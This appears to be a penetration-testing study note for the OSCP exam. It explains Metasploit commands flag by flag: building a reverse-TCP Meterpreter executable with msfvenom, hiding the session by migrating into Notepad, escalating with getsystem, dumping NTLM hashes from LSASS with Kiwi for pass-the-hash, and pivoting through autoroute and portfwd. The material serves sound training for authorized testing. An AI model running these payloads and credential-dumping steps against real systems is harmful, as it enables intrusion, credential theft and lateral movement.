# Metasploit Framework (Command Breakdowns)

Part of [[COMMAND BREAKDOWNS]]. Flag-by-flag and option-by-option breakdowns for MSF, msfvenom, Meterpreter, and related commands.

Cross-link: [[21. The Metasploit Framework|The Metasploit Framework]], source module note.

---

## msfvenom payload generation

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.x LPORT=443 -f exe -o met.exe
```

| Part | Meaning |
|---|---|
| `msfvenom` | Metasploit's standalone payload generator (replaces msfpayload + msfencode) |
| `-p windows/x64/meterpreter/reverse_tcp` | Payload path: platform/arch/type/variant. The `/` before `reverse_tcp` makes this **staged** — a small stager connects back, then MSF sends the full Meterpreter stage 2 |
| `LHOST=192.168.45.x` | IP the payload calls home to (your tun0 address) |
| `LPORT=443` | Port the payload connects to; 443 blends in better than 4444 in real tests |
| `-f exe` | Output format: `exe` (Windows PE), `elf` (Linux), `raw` (PHP/scripts), `war` (Tomcat), `aspx`, `ps1` |
| `-o met.exe` | Write to file; omit for stdout |

**Staged vs non-staged:**
- `windows/x64/meterpreter/reverse_tcp` — **staged** (slash before `reverse_tcp`): stager is small, real Meterpreter arrives in memory over the network
- `windows/x64/meterpreter_reverse_tcp` — **non-staged** (underscore): full shellcode in one shot, larger but simpler, nc can't receive but multi/handler can

---

## msfconsole -r (resource script launch)

```bash
sudo msfconsole -r /home/kali/listener.rc
```

| Part | Meaning |
|---|---|
| `sudo` | Required to bind privileged ports (443, 80); also needed for DB initialization |
| `msfconsole` | Launch MSF interactive console |
| `-r /home/kali/listener.rc` | Execute the `.rc` resource script immediately on start; each line runs as if typed at the `msf>` prompt |

---

## multi/handler advanced options

```
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```

| Option/Flag | Meaning |
|---|---|
| `AutoRunScript post/windows/manage/migrate` | Runs this post module automatically the moment a session opens. `manage/migrate` spawns Notepad and migrates Meterpreter into it, hiding the payload process |
| `ExitOnSession false` | Keep the handler listening after the first session. Without this, the handler exits once it catches one connection |
| `run -z` | Don't auto-interact with the new session (leaves you at `msf>` instead of dropping into Meterpreter) |
| `run -j` | Run as a background job so the terminal stays free for other modules |
| `run -z -j` | Both: background job + no auto-interact. Recommended for handler setup |

---

## getsystem

```
meterpreter > getsystem
```

| Part | Meaning |
|---|---|
| `getsystem` | Attempts multiple privilege escalation techniques in sequence until one succeeds |
| Technique 1: Named Pipe Impersonation (PrintSpooler) | Creates a named pipe, tricks PrintSpooler service (running as SYSTEM) into connecting to it, then impersonates the SYSTEM token |
| Technique 2: Named Pipe Impersonation (drop token) | Similar but uses a different impersonation approach |
| Technique 3: Token duplication | Duplicates an existing SYSTEM token from a running SYSTEM process (requires SeDebugPrivilege) |
| Requires | SeImpersonatePrivilege or SeDebugPrivilege — typically held by service accounts and local admins |

---

## migrate PID

```
meterpreter > migrate 6012
```

| Part | Meaning |
|---|---|
| `migrate` | Inject the Meterpreter payload into a different process |
| `6012` | Target PID from `ps` output. Choose a stable process (svchost.exe, explorer.exe, notepad.exe) |
| Why | Hides Meterpreter: `met.exe` disappears from process list. Also stabilises the session if the original process might exit |
| Privilege rule | Can only migrate to a process at the same or lower privilege level. Migrating from SYSTEM into a user process loses SYSTEM |

---

## execute -H -f notepad

```
meterpreter > execute -H -f notepad
```

| Flag | Meaning |
|---|---|
| `execute` | Run an executable on the target |
| `-H` | Hidden — spawns the process without a visible window |
| `-f notepad` | The program to run. `notepad.exe` is lightweight, always present, looks legitimate in the process list |

Typical pattern: `execute -H -f notepad` → `ps` to find the new Notepad PID → `migrate <PID>`.

---

## load kiwi + creds_msv

```
meterpreter > load kiwi
meterpreter > creds_msv
```

| Part | Meaning |
|---|---|
| `load kiwi` | Loads the Kiwi extension (a Meterpreter-native port of Mimikatz) into the current session. Requires SYSTEM (run `getsystem` first) |
| `creds_msv` | Dumps MSV1_0 credentials from LSASS memory. MSV1_0 is the Windows authentication package that stores NTLM hashes |
| Output columns | Username, Domain, NTLM (NT hash), SHA1 |
| NTLM hash use | Pass-the-Hash with psexec/crackmapexec/evil-winrm/xfreerdp: most tools want just the NT half (`aad3b435b51404eeaad3b435b51404ee:$AdminHash`) |

---

## use multi/manage/autoroute

```
use multi/manage/autoroute
set SESSION 1
run
```

| Part | Meaning |
|---|---|
| `multi/manage/autoroute` | Post module that reads the pivot host's own routing table and adds all discovered subnets as MSF routes automatically |
| `set SESSION 1` | Which Meterpreter session to use as the pivot. All routed traffic travels through this session |
| `run` | Executes the module. Internally runs `run autoroute -p` to enumerate, then adds each subnet |
| Effect | MSF modules can now target IPs in those subnets directly. Traffic: Kali → session 1 (pivot) → internal target |
| `route print` | Verify the routes were added after running |

**Why `bind_tcp` for second-hop exploits:** MSF routes only forward connections Kali *initiates*. Internal targets have no route back to Kali. Use `bind_tcp` payload so Kali connects to the target's open port through the route, not the other way around.

---

## portfwd add

```
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200
```

| Flag | Meaning |
|---|---|
| `portfwd add` | Create a new port forward through the current Meterpreter session |
| `-l 3389` | Local port on Kali to listen on |
| `-p 3389` | Remote port on the target to forward to |
| `-r 172.16.5.200` | Remote host (the internal machine you want to reach) |
| Result | Kali's `127.0.0.1:3389` connects directly to `172.16.5.200:3389` via the Meterpreter session. No proxychains needed |

---

## set SSL false (NiFi / wrong-version-number fix)

```
set SSL false
```

| Context | Fix |
|---|---|
| Error: `SSL_connect wrong version number` | MSF module is trying HTTPS against a plain HTTP service |
| Solution | `set SSL false` — disables TLS on the module's outbound connection |
| When it happens | Modules that have `SSL true` as a default (or inherited from a prior `setg`) hitting a non-SSL port |
| Side effect warning | MSF may warn "Changing SSL may require changing RPORT" — check that RPORT is still correct for plain HTTP (typically 80, 8080) |

#### Tags: #CommandBreakdowns #Metasploit #msfvenom #Meterpreter #getsystem #Kiwi #autoroute #portfwd #ResourceScripts #StagedPayloads #PtH #Module21
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for payload troubleshooting
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
## Why this matters for OSCP

This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.

## Related Modules

- [[MODULES/06. Information Gathering]] -- module concepts used by this hub page

## Demonstrated in box write-ups

- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
